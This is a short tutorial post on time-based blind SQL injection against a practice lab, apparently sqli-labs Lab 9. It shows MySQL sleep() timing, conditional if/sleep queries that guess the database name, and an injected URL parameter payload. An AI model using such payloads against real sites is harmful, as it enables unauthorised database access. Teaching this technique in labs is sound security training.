---
title: SQL注入-Blind injection time-based
date: 2017-08-26 10:58:44
categories: SQL注入
tags:
copyright:
---
Lab 9 does not give us a signal or an error that we have tampered the query, which results in Mysql error. So now it makes us check whether SQL injection is possible.
Here we introduce how to use the sleep command in Mysql. What we see from the screenshot is that we get a response 10 sec after running the query, so the Mysql sleeps for 10 seconds.
```c
mysql> select sleep(10);
+-----------+
| sleep(10) |
+-----------+
|         0 |
+-----------+
1 row in set (10.00 sec)
```
<!--more-->
Now when we run another query `select if
((select database()=”security”, sleep(10), null)`; we get the response 10 seconds after giving us the result that a database security exists. This is also known as a time-based SQL query.
Similarly if we try to run the query `select if ((select database()=”securi”, sleep(10), null);`there is no time-based response from the SQL server which means that such a database does not exist.
```c
mysql> select if((select database())='security',sleep(5),null);
+--------------------------------------------------+
| if((select database())='security',sleep(5),null) |
+--------------------------------------------------+
|                                                0 |
+--------------------------------------------------+
1 row in set (5.00 sec)

mysql> select if((select database())='secur',sleep(5),null);
+-----------------------------------------------+
| if((select database())='secur',sleep(5),null) |
+-----------------------------------------------+
|                                          NULL |
+-----------------------------------------------+
1 row in set (0.00 sec)
```
Now we do the same thing in our browser query.We alter the parameter with
`?id=1′ and ((select database()='security', sleep(10), null);`
There is a waiting response from the browser which you can notice at the bottom of the screenshot below. Since the time-based SQL query was able to detect a legitimate database it gives us the response. If the database name were incorrect, we would not have got a waiting response.